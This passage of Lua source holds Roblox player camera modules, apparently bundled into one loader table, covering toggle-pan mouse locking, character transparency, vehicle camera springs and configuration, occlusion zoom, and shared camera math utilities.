			function CameraUI.setCameraModeToastEnabled(enabled)
				if not enabled and not initialized then
					return
				end
		
				if not initialized then
					initializeUI()
				end
		
				toast.Visible = enabled
				if not enabled then
					CameraUI.setCameraModeToastOpen(false)
				end
			end
		
			local tweenInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		
			-- Tween the toast in or out. Toast must be enabled with setCameraModeToastEnabled.
			function CameraUI.setCameraModeToastOpen(open)
				assert(initialized)
		
				TweenService:Create(toast, tweenInfo, {
					Size = open and TOAST_OPEN_SIZE or TOAST_CLOSED_SIZE,
					ImageTransparency = open and TOAST_BACKGROUND_TRANS or 1,
				}):Play()
		
				TweenService:Create(toastIcon, tweenInfo, {
					ImageTransparency = open and TOAST_FOREGROUND_TRANS or 1,
				}):Play()
		
				TweenService:Create(toastUpperText, tweenInfo, {
					TextTransparency = open and TOAST_FOREGROUND_TRANS or 1,
				}):Play()
		
				TweenService:Create(toastLowerText, tweenInfo, {
					TextTransparency = open and TOAST_FOREGROUND_TRANS or 1,
				}):Play()
			end
		end
		
		return CameraUI
		
	end[camera_toggle_statecontroller] = function()
		local Players = game:GetService("Players")
		local UserInputService = game:GetService("UserInputService")
		local GameSettings = UserSettings():GetService("UserGameSettings")
		
		local LocalPlayer = Players.LocalPlayer
		if not LocalPlayer then
			Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
			LocalPlayer = Players.LocalPlayer
		end
		
		local Mouse = LocalPlayer:GetMouse()
		
		local Input = require(script.Parent:WaitForChild("CameraInput"))
		local CameraUI = require(script.Parent:WaitForChild("CameraUI"))
		
		local lastTogglePan = false
		local lastTogglePanChange = tick()
		
		local CROSS_MOUSE_ICON = "rbxasset://textures/Cursors/CrossMouseIcon.png"
		
		local lockStateDirty = false
		local wasTogglePanOnTheLastTimeYouWentIntoFirstPerson = false
		local lastFirstPerson = false
		
		CameraUI.setCameraModeToastEnabled(false)
		
		return function(isFirstPerson)
			local togglePan = Input.getTogglePan()
			local toastTimeout = 3
		
			if isFirstPerson and togglePan ~= lastTogglePan then
				lockStateDirty = true
			end
		
			if lastTogglePan ~= togglePan or tick() - lastTogglePanChange > toastTimeout then
				local doShow = togglePan and tick() - lastTogglePanChange < toastTimeout
		
				CameraUI.setCameraModeToastOpen(doShow)
		
				if togglePan then
					lockStateDirty = false
				end
				lastTogglePanChange = tick()
				lastTogglePan = togglePan
			end
		
			if isFirstPerson ~= lastFirstPerson then
				if isFirstPerson then
					wasTogglePanOnTheLastTimeYouWentIntoFirstPerson = Input.getTogglePan()
					Input.setTogglePan(true)
				elseif not lockStateDirty then
					Input.setTogglePan(wasTogglePanOnTheLastTimeYouWentIntoFirstPerson)
				end
			end
		
			if isFirstPerson then
				if Input.getTogglePan() then
					Mouse.Icon = CROSS_MOUSE_ICON
					UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
					GameSettings.RotationType = Enum.RotationType.CameraRelative
				else
					Mouse.Icon = ""
					UserInputService.MouseBehavior = Enum.MouseBehavior.Default
					GameSettings.RotationType = Enum.RotationType.CameraRelative
				end
		
			elseif Input.getTogglePan() then
				Mouse.Icon = CROSS_MOUSE_ICON
				UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
				GameSettings.RotationType = Enum.RotationType.MovementRelative
		
			elseif Input.getHoldPan() then
				Mouse.Icon = ""
				UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
				GameSettings.RotationType = Enum.RotationType.MovementRelative
		
			else
				Mouse.Icon = ""
				UserInputService.MouseBehavior = Enum.MouseBehavior.Default
				GameSettings.RotationType = Enum.RotationType.MovementRelative
			end
		
			lastFirstPerson = isFirstPerson
		end
		
	end[base_occlusion] = function()
		--[[
			BaseOcclusion - Abstract base class for character occlusion control modules
			2018 Camera Update - AllYourBlox
		--]]
		
		--[[ The Module ]]--
		local BaseOcclusion = {}
		BaseOcclusion.__index = BaseOcclusion
		setmetatable(BaseOcclusion, {
			__call = function(_, ...)
				return BaseOcclusion.new(...)
			end
		})
		
		function BaseOcclusion.new()
			local self = setmetatable({}, BaseOcclusion)
			return self
		end
		
		-- Called when character is added
		function BaseOcclusion:CharacterAdded(char, player)
		end
		
		-- Called when character is about to be removed
		function BaseOcclusion:CharacterRemoving(char, player)
		end
		
		function BaseOcclusion:OnCameraSubjectChanged(newSubject)
		end
		
		--[[ Derived classes are required to override and implement all of the following functions ]]--
		function BaseOcclusion:GetOcclusionMode()
			-- Must be overridden in derived classes to return an Enum.DevCameraOcclusionMode value
			warn("BaseOcclusion GetOcclusionMode must be overridden by derived classes")
			return nil
		end
		
		function BaseOcclusion:Enable(enabled)
			warn("BaseOcclusion Enable must be overridden by derived classes")
		end
		
		function BaseOcclusion:Update(dt, desiredCameraCFrame, desiredCameraFocus)
			warn("BaseOcclusion Update must be overridden by derived classes")
			return desiredCameraCFrame, desiredCameraFocus
		end
		
		return BaseOcclusion
		
	end[transparency_controller] = function()
		--[[
			TransparencyController - Manages transparency of player character at close camera-to-subject distances
			2018 Camera Update - AllYourBlox
		--]]
		
		local MAX_TWEEN_RATE = 2.8 -- per second
		
		local Util = require(script.Parent:WaitForChild("CameraUtils"))
		
		--[[ The Module ]]--
		local TransparencyController = {}
		TransparencyController.__index = TransparencyController
		
		function TransparencyController.new()
			local self = setmetatable({}, TransparencyController)
		
			self.lastUpdate = tick()
			self.transparencyDirty = false
			self.enabled = false
			self.lastTransparency = nil
		
			self.descendantAddedConn, self.descendantRemovingConn = nil, nil
			self.toolDescendantAddedConns = {}
			self.toolDescendantRemovingConns = {}
			self.cachedParts = {}
		
			return self
		end
		
		
		function TransparencyController:HasToolAncestor(object)
			if object.Parent == nil then return false end
			return object.Parent:IsA('Tool') or self:HasToolAncestor(object.Parent)
		end
		
		function TransparencyController:IsValidPartToModify(part)
			if part:IsA('BasePart') or part:IsA('Decal') then
				return not self:HasToolAncestor(part)
			end
			return false
		end
		
		function TransparencyController:CachePartsRecursive(object)
			if object then
				if self:IsValidPartToModify(object) then
					self.cachedParts[object] = true
					self.transparencyDirty = true
				end
				for _, child in pairs(object:GetChildren()) do
					self:CachePartsRecursive(child)
				end
			end
		end
		
		function TransparencyController:TeardownTransparency()
			for child, _ in pairs(self.cachedParts) do
				child.LocalTransparencyModifier = 0
			end
			self.cachedParts = {}
			self.transparencyDirty = true
			self.lastTransparency = nil
		
			if self.descendantAddedConn then
				self.descendantAddedConn:disconnect()
				self.descendantAddedConn = nil
			end
			if self.descendantRemovingConn then
				self.descendantRemovingConn:disconnect()
				self.descendantRemovingConn = nil
			end
			for object, conn in pairs(self.toolDescendantAddedConns) do
				conn:Disconnect()
				self.toolDescendantAddedConns[object] = nil
			end
			for object, conn in pairs(self.toolDescendantRemovingConns) do
				conn:Disconnect()
				self.toolDescendantRemovingConns[object] = nil
			end
		end
		
		function TransparencyController:SetupTransparency(character)
			self:TeardownTransparency()
		
			if self.descendantAddedConn then self.descendantAddedConn:disconnect() end
			self.descendantAddedConn = character.DescendantAdded:Connect(function(object)
				-- This is a part we want to invisify
				if self:IsValidPartToModify(object) then
					self.cachedParts[object] = true
					self.transparencyDirty = true
				-- There is now a tool under the character
				elseif object:IsA('Tool') then
					if self.toolDescendantAddedConns[object] then self.toolDescendantAddedConns[object]:Disconnect() end
					self.toolDescendantAddedConns[object] = object.DescendantAdded:Connect(function(toolChild)
						self.cachedParts[toolChild] = nil
						if toolChild:IsA('BasePart') or toolChild:IsA('Decal') then
							-- Reset the transparency
							toolChild.LocalTransparencyModifier = 0
						end
					end)
					if self.toolDescendantRemovingConns[object] then self.toolDescendantRemovingConns[object]:disconnect() end
					self.toolDescendantRemovingConns[object] = object.DescendantRemoving:Connect(function(formerToolChild)
						wait() -- wait for new parent
						if character and formerToolChild and formerToolChild:IsDescendantOf(character) then
							if self:IsValidPartToModify(formerToolChild) then
								self.cachedParts[formerToolChild] = true
								self.transparencyDirty = true
							end
						end
					end)
				end
			end)
			if self.descendantRemovingConn then self.descendantRemovingConn:disconnect() end
			self.descendantRemovingConn = character.DescendantRemoving:connect(function(object)
				if self.cachedParts[object] then
					self.cachedParts[object] = nil
					-- Reset the transparency
					object.LocalTransparencyModifier = 0
				end
			end)
			self:CachePartsRecursive(character)
		end
		
		
		function TransparencyController:Enable(enable)
			if self.enabled ~= enable then
				self.enabled = enable
				self:Update()
			end
		end
		
		function TransparencyController:SetSubject(subject)
			local character = nil
			if subject and subject:IsA("Humanoid") then
				character = subject.Parent
			end
			if subject and subject:IsA("VehicleSeat") and subject.Occupant then
				character = subject.Occupant.Parent
			end
			if character then
				self:SetupTransparency(character)
			else
				self:TeardownTransparency()
			end
		end
		
		function TransparencyController:Update()
			local instant = false
			local now = tick()
			local currentCamera = workspace.CurrentCamera
		
			if currentCamera then
				local transparency = 0
				if not self.enabled then
					instant = true
				else
					local distance = (currentCamera.Focus.p - currentCamera.CoordinateFrame.p).magnitude
					transparency = (distance<2) and (1.0-(distance-0.5)/1.5) or 0 --(7 - distance) / 5
					if transparency < 0.5 then
						transparency = 0
					end
		
					if self.lastTransparency then
						local deltaTransparency = transparency - self.lastTransparency
		
						-- Don't tween transparency if it is instant or your character was fully invisible last frame
						if not instant and transparency < 1 and self.lastTransparency < 0.95 then
							local maxDelta = MAX_TWEEN_RATE * (now - self.lastUpdate)
							deltaTransparency = math.clamp(deltaTransparency, -maxDelta, maxDelta)
						end
						transparency = self.lastTransparency + deltaTransparency
					else
						self.transparencyDirty = true
					end
		
					transparency = math.clamp(Util.Round(transparency, 2), 0, 1)
				end
		
				if self.transparencyDirty or self.lastTransparency ~= transparency then
					for child, _ in pairs(self.cachedParts) do
						child.LocalTransparencyModifier = transparency
					end
					self.transparencyDirty = false
					self.lastTransparency = transparency
				end
			end
			self.lastUpdate = now
		end
		
		return TransparencyController
		
	end[vehicle_camera] = function()
		local EPSILON = 1e-3
		local PITCH_LIMIT = math.rad(80)
		local YAW_DEFAULT = math.rad(0)
		local ZOOM_MINIMUM = 0.5
		local ZOOM_SENSITIVITY_CURVATURE = 0.5
		
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		
		local BaseCamera = require(script.Parent:WaitForChild("BaseCamera"))
		local CameraInput = require(script.Parent:WaitForChild("CameraInput"))
		local CameraUtils = require(script.Parent:WaitForChild("CameraUtils"))
		local ZoomController = require(script.Parent:WaitForChild("ZoomController"))
		local VehicleCameraCore = require(script:WaitForChild("VehicleCameraCore"))
		local VehicleCameraConfig = require(script:WaitForChild("VehicleCameraConfig"))
		
		local localPlayer = Players.LocalPlayer
		
		local map = CameraUtils.map
		local Spring = CameraUtils.Spring
		local mapClamp = CameraUtils.mapClamp
		local sanitizeAngle = CameraUtils.sanitizeAngle
		
		-- pitch-axis rotational velocity of a part with a given CFrame and total RotVelocity
		local function pitchVelocity(rotVel, cf)
			return math.abs(cf.XVector:Dot(rotVel))
		end
		
		-- yaw-axis rotational velocity of a part with a given CFrame and total RotVelocity
		local function yawVelocity(rotVel, cf)
			return math.abs(cf.YVector:Dot(rotVel))
		end
		
		-- track physics solver time delta separately from the render loop to correctly synchronize time delta
		local worldDt = 1/60
		RunService.Stepped:Connect(function(_, _worldDt)
			worldDt = _worldDt
		end)
		
		local VehicleCamera = setmetatable({}, BaseCamera)
		VehicleCamera.__index = VehicleCamera
		
		function VehicleCamera.new()
			local self = setmetatable(BaseCamera.new(), VehicleCamera)
			self:Reset()
			return self
		end
		
		function VehicleCamera:Reset()
			self.vehicleCameraCore = VehicleCameraCore.new(self:GetSubjectCFrame())
			self.pitchSpring = Spring.new(0, -math.rad(VehicleCameraConfig.pitchBaseAngle))
			self.yawSpring = Spring.new(0, YAW_DEFAULT)
			self.lastPanTick = 0
			
			local camera = workspace.CurrentCamera
			local cameraSubject = camera and camera.CameraSubject
			
			assert(camera)
			assert(cameraSubject)
			assert(cameraSubject:IsA("VehicleSeat"))
			
			local assemblyParts = cameraSubject:GetConnectedParts(true) -- passing true to recursively get all assembly parts
			local assemblyPosition, assemblyRadius = CameraUtils.getLooseBoundingSphere(assemblyParts)
			
			assemblyRadius = math.max(assemblyRadius, EPSILON)
			
			self.assemblyRadius = assemblyRadius
			self.assemblyOffset = cameraSubject.CFrame:Inverse()*assemblyPosition -- seat-space offset of the assembly bounding sphere center
			
			self:_StepInitialZoom()
		end
		
		function VehicleCamera:_StepInitialZoom()
			self:SetCameraToSubjectDistance(math.max(
				ZoomController.GetZoomRadius(),
				self.assemblyRadius*VehicleCameraConfig.initialZoomRadiusMul
			))
		end
		
		function VehicleCamera:_StepRotation(dt, vdotz)
			local yawSpring = self.yawSpring
			local pitchSpring = self.pitchSpring
			
			local rotationInput = CameraInput.getRotation(true)
			local dYaw = -rotationInput.X
			local dPitch = -rotationInput.Y
			
			yawSpring.pos = sanitizeAngle(yawSpring.pos + dYaw)
			pitchSpring.pos = sanitizeAngle(math.clamp(pitchSpring.pos + dPitch, -PITCH_LIMIT, PITCH_LIMIT))
		
			if CameraInput.getRotationActivated() then
				self.lastPanTick = os.clock()
			end
		
			local pitchBaseAngle = -math.rad(VehicleCameraConfig.pitchBaseAngle)
			local pitchDeadzoneAngle = math.rad(VehicleCameraConfig.pitchDeadzoneAngle)
		
			if os.clock() - self.lastPanTick > VehicleCameraConfig.autocorrectDelay then
				-- adjust autocorrect response based on forward velocity
				local autocorrectResponse = mapClamp(
					vdotz,
					VehicleCameraConfig.autocorrectMinCarSpeed,
					VehicleCameraConfig.autocorrectMaxCarSpeed,
					0,
					VehicleCameraConfig.autocorrectResponse
				)
		
				yawSpring.freq = autocorrectResponse
				pitchSpring.freq = autocorrectResponse
				
				-- zero out response under a threshold
				if yawSpring.freq < EPSILON then
					yawSpring.vel = 0
				end
		
				if pitchSpring.freq < EPSILON then
					pitchSpring.vel = 0
				end
		
				if math.abs(sanitizeAngle(pitchBaseAngle - pitchSpring.pos)) <= pitchDeadzoneAngle then
					-- do nothing within the deadzone
					pitchSpring.goal = pitchSpring.pos
				else
					pitchSpring.goal = pitchBaseAngle
				end
			else
				yawSpring.freq = 0
				yawSpring.vel = 0
		
				pitchSpring.freq = 0
				pitchSpring.vel = 0
		
				pitchSpring.goal = pitchBaseAngle
			end
		
			return CFrame.fromEulerAnglesYXZ(
				pitchSpring:step(dt),
				yawSpring:step(dt),
				0
			)
		end
		
		function VehicleCamera:_GetThirdPersonLocalOffset()
			return self.assemblyOffset + Vector3.new(0, self.assemblyRadius*VehicleCameraConfig.verticalCenterOffset, 0)
		end
		
		function VehicleCamera:_GetFirstPersonLocalOffset(subjectCFrame)
			local character = localPlayer.Character
			
			if character and character.Parent then
				local head = character:FindFirstChild("Head")
				
				if head and head:IsA("BasePart") then
					return subjectCFrame:Inverse()*head.Position
				end
			end
			
			return self:_GetThirdPersonLocalOffset()
		end
		
		function VehicleCamera:Update()
			local camera = workspace.CurrentCamera
			local cameraSubject = camera and camera.CameraSubject
			local vehicleCameraCore = self.vehicleCameraCore
			
			assert(camera)
			assert(cameraSubject)
			assert(cameraSubject:IsA("VehicleSeat"))
			
			-- consume the physics solver time delta to account for mismatched physics/render cycles
			local dt = worldDt
			worldDt = 0
			
			-- get subject info
			local subjectCFrame = self:GetSubjectCFrame()
			local subjectVel = self:GetSubjectVelocity()
			local subjectRotVel = self:GetSubjectRotVelocity()
			
			-- measure the local-to-world-space forward velocity of the vehicle
			local vDotZ = math.abs(subjectVel:Dot(subjectCFrame.ZVector))
			local yawVel = yawVelocity(subjectRotVel, subjectCFrame)
			local pitchVel = pitchVelocity(subjectRotVel, subjectCFrame)
			
			-- step camera components forward
			local zoom = self:StepZoom()
			local objectRotation = self:_StepRotation(dt, vDotZ)
			
			-- mix third and first person offsets in local space
			local firstPerson = mapClamp(zoom, ZOOM_MINIMUM, self.assemblyRadius, 1, 0)
			
			local tpOffset = self:_GetThirdPersonLocalOffset()
			local fpOffset = self:_GetFirstPersonLocalOffset(subjectCFrame)
			local localOffset = tpOffset:Lerp(fpOffset, firstPerson)
			
			-- step core forward
			vehicleCameraCore:setTransform(subjectCFrame)
			local processedRotation = vehicleCameraCore:step(dt, pitchVel, yawVel, firstPerson)
			
			-- calculate final focus & cframe
			local focus = CFrame.new(subjectCFrame*localOffset)*processedRotation*objectRotation
			local cf = focus*CFrame.new(0, 0, zoom)
		
			return cf, focus
		end
		
		function VehicleCamera:ApplyVRTransform()
			-- no-op override; VR transform is not applied in vehicles
		end
		
		function VehicleCamera:EnterFirstPerson()
			self.inFirstPerson = true
			self:UpdateMouseBehavior()
		end
		
		function VehicleCamera:LeaveFirstPerson()
			self.inFirstPerson = false
			self:UpdateMouseBehavior()
		end
		
		return VehicleCamera
		
	end[vehicle_camera_core] = function()
		local CameraUtils = require(script.Parent.Parent.CameraUtils)
		local VehicleCameraConfig = require(script.Parent.VehicleCameraConfig)
		
		local map = CameraUtils.map
		local mapClamp = CameraUtils.mapClamp
		local sanitizeAngle = CameraUtils.sanitizeAngle
		
		-- extract sanitized yaw from a CFrame rotation
		local function getYaw(cf)
			local _, yaw = cf:toEulerAnglesYXZ()
			return sanitizeAngle(yaw)
		end
		
		-- extract sanitized pitch from a CFrame rotation
		local function getPitch(cf)
			local pitch = cf:toEulerAnglesYXZ()
			return sanitizeAngle(pitch)
		end
		
		-- step a damped angular spring axis
		local function stepSpringAxis(dt, f, g, p, v)
			local offset = sanitizeAngle(p - g)
			local decay = math.exp(-f*dt)
		
			local p1 = sanitizeAngle((offset*(1 + f*dt) + v*dt)*decay + g)
			local v1 = (v*(1 - f*dt) - offset*(f*f*dt))*decay
		
			return p1, v1
		end
		
		-- value damper with separate response frequencies for rising and falling values
		local VariableEdgeSpring = {} do
			VariableEdgeSpring.__index = VariableEdgeSpring
		
			function VariableEdgeSpring.new(fRising, fFalling, position)
				return setmetatable({
					fRising = fRising,
					fFalling = fFalling,
					g = position,
					p = position,
					v = position*0,
				}, VariableEdgeSpring)
			end
		
			function VariableEdgeSpring:step(dt)
				local fRising = self.fRising
				local fFalling = self.fFalling
				local g = self.g
				local p0 = self.p
				local v0 = self.v
		
				local f = 2*math.pi*(v0 > 0 and fRising or fFalling)
		
				local offset = p0 - g
				local decay = math.exp(-f*dt)
		
				local p1 = (offset*(1 + f*dt) + v0*dt)*decay + g
				local v1 = (v0*(1 - f*dt) - offset*(f*f*dt))*decay
		
				self.p = p1
				self.v = v1
		
				return p1
			end
		end
		
		-- damps a 3D rotation in Tait-Bryan YXZ space, filtering out Z
		local YawPitchSpring = {} do
			YawPitchSpring.__index = YawPitchSpring
		
			function YawPitchSpring.new(cf)
				assert(typeof(cf) == "CFrame")
				
				return setmetatable({
					yawG = getYaw(cf), -- yaw goal
					yawP = getYaw(cf), -- yaw position
					yawV = 0, -- yaw velocity
		
					pitchG = getPitch(cf), -- pitch goal
					pitchP = getPitch(cf), -- pitch position
					pitchV = 0, -- pitch velocity
		
					-- yaw/pitch response springs
					fSpringYaw = VariableEdgeSpring.new(
						VehicleCameraConfig.yawReponseDampingRising,
						VehicleCameraConfig.yawResponseDampingFalling,
						0
					),
					fSpringPitch = VariableEdgeSpring.new(
						VehicleCameraConfig.pitchReponseDampingRising,
						VehicleCameraConfig.pitchResponseDampingFalling,
						0
					),
				}, YawPitchSpring)
			end
			
			-- Extract Tait-Bryan angles from a CFrame rotation
			function YawPitchSpring:setGoal(goalCFrame)
				assert(typeof(goalCFrame) == "CFrame")
				
				self.yawG = getYaw(goalCFrame)
				self.pitchG = getPitch(goalCFrame)
			end
		
			function YawPitchSpring:getCFrame()
				return CFrame.fromEulerAnglesYXZ(self.pitchP, self.yawP, 0)
			end
		
			function YawPitchSpring:step(dt, pitchVel, yawVel, firstPerson)
				assert(typeof(dt) == "number")
				assert(typeof(yawVel) == "number")
				assert(typeof(pitchVel) == "number")
				assert(typeof(firstPerson) == "number")
				
				local fSpringYaw = self.fSpringYaw
				local fSpringPitch = self.fSpringPitch
				
				-- calculate the frequency spring
				fSpringYaw.g = mapClamp(
					map(firstPerson, 0, 1, yawVel, 0),
					math.rad(VehicleCameraConfig.cutoffMinAngularVelYaw),
					math.rad(VehicleCameraConfig.cutoffMaxAngularVelYaw),
					1, 0
				)
		
				fSpringPitch.g = mapClamp(
					map(firstPerson, 0, 1, pitchVel, 0),
					math.rad(VehicleCameraConfig.cutoffMinAngularVelPitch),
					math.rad(VehicleCameraConfig.cutoffMaxAngularVelPitch),
					1, 0
				)
				
				-- calculate final frequencies
				local fYaw = 2*math.pi*VehicleCameraConfig.yawStiffness*fSpringYaw:step(dt)
				local fPitch = 2*math.pi*VehicleCameraConfig.pitchStiffness*fSpringPitch:step(dt)
				
				-- adjust response for first person
				fPitch *= map(firstPerson, 0, 1, 1, VehicleCameraConfig.firstPersonResponseMul)
				fYaw *= map(firstPerson, 0, 1, 1, VehicleCameraConfig.firstPersonResponseMul)
				
				-- step yaw
				self.yawP, self.yawV = stepSpringAxis(
					dt,
					fYaw,
					self.yawG,
					self.yawP,
					self.yawV
				)
				
				-- step pitch
				self.pitchP, self.pitchV = stepSpringAxis(
					dt,
					fPitch,
					self.pitchG,
					self.pitchP,
					self.pitchV
				)
		
				return self:getCFrame()
			end
		end
		
		local VehicleCameraCore = {} do
			VehicleCameraCore.__index = VehicleCameraCore
		
			function VehicleCameraCore.new(transform)
				return setmetatable({
					vrs = YawPitchSpring.new(transform)
				}, VehicleCameraCore)
			end
		
			function VehicleCameraCore:step(dt, pitchVel, yawVel, firstPerson)
				return self.vrs:step(dt, pitchVel, yawVel, firstPerson)
			end
		
			function VehicleCameraCore:setTransform(transform)
				self.vrs:setGoal(transform)
			end
		end
		
		return VehicleCameraCore
		
	end[vehicle_camera_config] = function()
		local VEHICLE_CAMERA_CONFIG = {
			-- (hz) Camera response stiffness along the pitch axis
			pitchStiffness = 0.5,
		
			-- (hz) Camera response stiffness along the yaw axis
			yawStiffness = 2.5,
		
			-- (s) Delay after use input before the camera can begin autorotating
			autocorrectDelay = 1,
		
			-- (studs/s) Minimum vehicle speed before the autocorrect begins to activate
			autocorrectMinCarSpeed = 16,
		
			-- (studs/s) Vehicle speed where autocorrect is fully activated
			autocorrectMaxCarSpeed = 32,
		
			-- (hz) Autocorrect stiffness/speed
			autocorrectResponse = 0.5,
		
			-- (deg/s) Minimum angular yaw velocity before the camera rotation cutoff begins
			cutoffMinAngularVelYaw = 60,
		
			-- (deg/s) Maximum angular yaw velocity where the camera rotation cutoff is fully activated
			cutoffMaxAngularVelYaw = 180,
		
			-- (deg/s) Minimum angular pitch velocity before the camera rotation cutoff begins
			cutoffMinAngularVelPitch = 15,
		
			-- (deg/s) Maximum angular pitch velocity where the camera rotation cutoff is fully activated
			cutoffMaxAngularVelPitch = 60,
		
			-- (deg) Default pitch angle relative to the horizon
			pitchBaseAngle = 18,
		
			-- (deg) Half-size of the deadzone angle for pitch autocorrect
			pitchDeadzoneAngle = 12,
		
			-- (unitless) Multiplier for camera response stiffness in first-person mode
			firstPersonResponseMul = 10,
		
			-- (hz) Responsiveness of yaw cutoff to rising angular velocities
			yawReponseDampingRising = 1,
		
			-- (hz) Responsiveness of yaw cutoff to falling angular velocities
			yawResponseDampingFalling = 3,
		
			-- (hz) Responsiveness of pitch cutoff to rising angular velocities
			pitchReponseDampingRising = 1,
		
			-- (hz) Responsiveness of pitch cutoff to falling angular velocities
			pitchResponseDampingFalling = 3,
		
			-- (unitless) Initial zoom radius as a fraction of car radius
			initialZoomRadiusMul = 3,
		
			-- (unitless) Vertical third-person camera offset as a fraction of car radius
			verticalCenterOffset = 0.33,
		}
		
		return VEHICLE_CAMERA_CONFIG
		
	end[poppercam] = function()
		--[[
			Poppercam - Occlusion module that brings the camera closer to the subject when objects are blocking the view.
		--]]
		
		local ZoomController =  require(script.Parent:WaitForChild("ZoomController"))
		
		local TransformExtrapolator = {} do
			TransformExtrapolator.__index = TransformExtrapolator
		
			local CF_IDENTITY = CFrame.new()
		
			local function cframeToAxis(cframe)
				local axis, angle = cframe:toAxisAngle()
				return axis*angle
			end
		
			local function axisToCFrame(axis)
				local angle = axis.magnitude
				if angle > 1e-5 then
					return CFrame.fromAxisAngle(axis, angle)
				end
				return CF_IDENTITY
			end
		
			local function extractRotation(cf)
				local _, _, _, xx, yx, zx, xy, yy, zy, xz, yz, zz = cf:components()
				return CFrame.new(0, 0, 0, xx, yx, zx, xy, yy, zy, xz, yz, zz)
			end
		
			function TransformExtrapolator.new()
				return setmetatable({
					lastCFrame = nil,
				}, TransformExtrapolator)
			end
		
			function TransformExtrapolator:Step(dt, currentCFrame)
				local lastCFrame = self.lastCFrame or currentCFrame
				self.lastCFrame = currentCFrame
		
				local currentPos = currentCFrame.p
				local currentRot = extractRotation(currentCFrame)
		
				local lastPos = lastCFrame.p
				local lastRot = extractRotation(lastCFrame)
		
				-- Estimate velocities from the delta between now and the last frame
				-- This estimation can be a little noisy.
				local dp = (currentPos - lastPos)/dt
				local dr = cframeToAxis(currentRot*lastRot:inverse())/dt
		
				local function extrapolate(t)
					local p = dp*t + currentPos
					local r = axisToCFrame(dr*t)*currentRot
					return r + p
				end
		
				return {
					extrapolate = extrapolate,
					posVelocity = dp,
					rotVelocity = dr,
				}
			end
		
			function TransformExtrapolator:Reset()
				self.lastCFrame = nil
			end
		end
		
		--[[ The Module ]]--
		local BaseOcclusion = require(script.Parent:WaitForChild("BaseOcclusion"))
		local Poppercam = setmetatable({}, BaseOcclusion)
		Poppercam.__index = Poppercam
		
		function Poppercam.new()
			local self = setmetatable(BaseOcclusion.new(), Poppercam)
			self.focusExtrapolator = TransformExtrapolator.new()
			return self
		end
		
		function Poppercam:GetOcclusionMode()
			return Enum.DevCameraOcclusionMode.Zoom
		end
		
		function Poppercam:Enable(enable)
			self.focusExtrapolator:Reset()
		end
		
		function Poppercam:Update(renderDt, desiredCameraCFrame, desiredCameraFocus, cameraController)
			local rotatedFocus = CFrame.new(desiredCameraFocus.p, desiredCameraCFrame.p)*CFrame.new(
				0, 0, 0,
				-1, 0, 0,
				0, 1, 0,
				0, 0, -1
			)
			local extrapolation = self.focusExtrapolator:Step(renderDt, rotatedFocus)
			local zoom = ZoomController.Update(renderDt, rotatedFocus, extrapolation)
			return rotatedFocus*CFrame.new(0, 0, zoom), desiredCameraFocus
		end
		
		-- Called when character is added
		function Poppercam:CharacterAdded(character, player)
		end
		
		-- Called when character is about to be removed
		function Poppercam:CharacterRemoving(character, player)
		end
		
		function Poppercam:OnCameraSubjectChanged(newSubject)
		end
		
		return Poppercam
	end[camera_utils] = function()
		--[[
			CameraUtils - Math utility functions shared by multiple camera scripts
			2018 Camera Update - AllYourBlox
		--]]
		
		local CameraUtils = {}
		
		local function round(num)
			return math.floor(num + 0.5)
		end
		
		-- Critically damped spring class for fluid motion effects
		local Spring = {} do
			Spring.__index = Spring
		
			-- Initialize to a given undamped frequency and default position
			function Spring.new(freq, pos)
				return setmetatable({
					freq = freq,
					goal = pos,
					pos = pos,
					vel = 0,
				}, Spring)
			end
		
			-- Advance the spring simulation by `dt` seconds
			function Spring:step(dt)
				local f = self.freq*2*math.pi
				local g = self.goal
				local p0 = self.pos
				local v0 = self.vel
		
				local offset = p0 - g
				local decay = math.exp(-f*dt)
		
				local p1 = (offset*(1 + f*dt) + v0*dt)*decay + g
				local v1 = (v0*(1 - f*dt) - offset*(f*f*dt))*decay
		
				self.pos = p1
				self.vel = v1
		
				return p1
			end
		end
		
		CameraUtils.Spring = Spring
		
		-- map a value from one range to another
		function CameraUtils.map(x, inMin, inMax, outMin, outMax)
			return (x - inMin)*(outMax - outMin)/(inMax - inMin) + outMin
		end
		
		-- maps a value from one range to another, clamping to the output range. order does not matter
		function CameraUtils.mapClamp(x, inMin, inMax, outMin, outMax)
			return math.clamp(
				(x - inMin)*(outMax - outMin)/(inMax - inMin) + outMin,
				math.min(outMin, outMax),
				math.max(outMin, outMax)
			)
		end
		
		-- Ritter's loose bounding sphere algorithm
		function CameraUtils.getLooseBoundingSphere(parts)
			local points = table.create(#parts)
			for idx, part in pairs(parts) do
				points[idx] = part.Position
			end
			
			-- pick an arbitrary starting point
			local x = points[1]
		
			-- get y, the point furthest from x
			local y = x
			local yDist = 0
		
			for _, p in ipairs(points) do
				local pDist = (p - x).Magnitude
		
				if pDist > yDist then
					y = p
					yDist = pDist
				end
			end
		
			-- get z, the point furthest from y
			local z = y
			local zDist = 0
		
			for _, p in ipairs(points) do
				local pDist = (p - y).Magnitude
		
				if pDist > zDist then
					z = p
					zDist = pDist
				end
			end
		
			-- use (y, z) as the initial bounding sphere
			local sc = (y + z)*0.5
			local sr = (y - z).Magnitude*0.5
		
			-- expand sphere to fit any outlying points
			for _, p in ipairs(points) do
				local pDist = (p - sc).Magnitude
		
				if pDist > sr then
					-- shift to midpoint
					sc = sc + (pDist - sr)*0.5*(p - sc).Unit
		
					-- expand
					sr = (pDist + sr)*0.5
				end
			end
		
			return sc, sr
		end
		
		-- canonicalize an angle to +-180 degrees
		function CameraUtils.sanitizeAngle(a)
			return (a + math.pi)%(2*math.pi) - math.pi
		end
		
		-- From TransparencyController
		function CameraUtils.Round(num, places)
			local decimalPivot = 10^places
			return math.floor(num * decimalPivot + 0.5) / decimalPivot
		end
		
		function CameraUtils.IsFinite(val)
			return val == val and val ~= math.huge and val ~= -math.huge
		end
		
		function CameraUtils.IsFiniteVector3(vec3)
			return CameraUtils.IsFinite(vec3.X) and CameraUtils.IsFinite(vec3.Y) and CameraUtils.IsFinite(vec3.Z)
		end
		
		-- Legacy implementation renamed
		function CameraUtils.GetAngleBetweenXZVectors(v1, v2)
			return math.atan2(v2.X*v1.Z-v2.Z*v1.X, v2.X*v1.X+v2.Z*v1.Z)
		end
		
